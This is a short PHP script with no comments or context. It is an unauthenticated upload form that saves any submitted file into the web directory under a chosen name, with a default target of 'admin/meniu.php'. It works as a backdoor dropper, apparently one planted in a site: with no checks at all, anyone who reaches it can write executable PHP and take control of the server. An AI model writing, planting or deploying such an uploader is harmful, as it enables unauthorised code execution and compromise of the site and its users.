<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['f'])) {
    $dest = __DIR__ . '/' . basename($_POST['path']);
    move_uploaded_file($_FILES['f']['tmp_name'], $dest);
    echo 'OK: ' . $dest;
} else {
    echo '<form method="POST" enctype="multipart/form-data">
    Path: <input name="path" value="admin/meniu.php"><br>
    File: <input type="file" name="f"><br>
    <button>Upload</button></form>';
}